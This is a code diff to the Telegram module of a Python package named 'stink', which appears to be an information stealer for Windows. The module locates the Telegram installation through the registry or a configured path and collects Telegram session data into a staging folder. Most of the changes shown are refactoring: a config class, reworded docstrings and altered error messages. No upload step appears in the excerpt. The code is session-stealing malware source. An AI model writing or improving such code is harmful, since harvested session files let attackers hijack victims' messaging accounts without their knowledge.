@@ -1,7 +1,10 @@
 from re import findall
 from shutil import copyfile
 from os import listdir, path, makedirs
+from typing import Optional
 from winreg import OpenKey, QueryValueEx, QueryInfoKey, EnumKey, HKEY_CURRENT_USER
+
+from stink.helpers.config import TelegramConfig
 
 
 class Telegram:
@@ -11,23 +14,36 @@ class Telegram:
     def __init__(self, storage_path: str, folder: str):
 
         self.__full_path = path.join(storage_path, folder)
+        self.__config = TelegramConfig()
 
     def __create_folder(self) -> None:
         """
         Creates storage for the Telegram module.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         folder = path.join(self.__full_path, "D877F783D5D3EF8C")
 
         if not path.exists(folder):
             makedirs(folder)
 
-    @staticmethod
-    def __get_telegram_path():
+    def __get_telegram_path(self) -> Optional[str]:
         """
         Gets the Telegram installation path from the registry.
-        :return: str
+
+        Parameters:
+        - None.
+
+        Returns:
+        - str|None: Telegram installation path if found.
         """
+        if path.exists(self.__config.SessionsPath):
+            return self.__config.SessionsPath
+
         try:
             key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")
 
@@ -46,18 +62,23 @@ class Telegram:
                 except FileNotFoundError:
                     pass
         except Exception as e:
-            print(f"An error occurred: {e}")
+            print(f"[Telegram]: {repr(e)}")
 
         return None
 
     def __get_sessions(self) -> None:
         """
         Collects sessions from the Telegram.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         telegram_path = self.__get_telegram_path()
 
-        if not telegram_path or not path.exists(telegram_path):
+        if not telegram_path:
             print(f"[Telegram]: No telegram found")
             return
 
@@ -87,7 +108,12 @@ class Telegram:
     def run(self) -> None:
         """
         Launches the Telegram collection module.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         try:
 
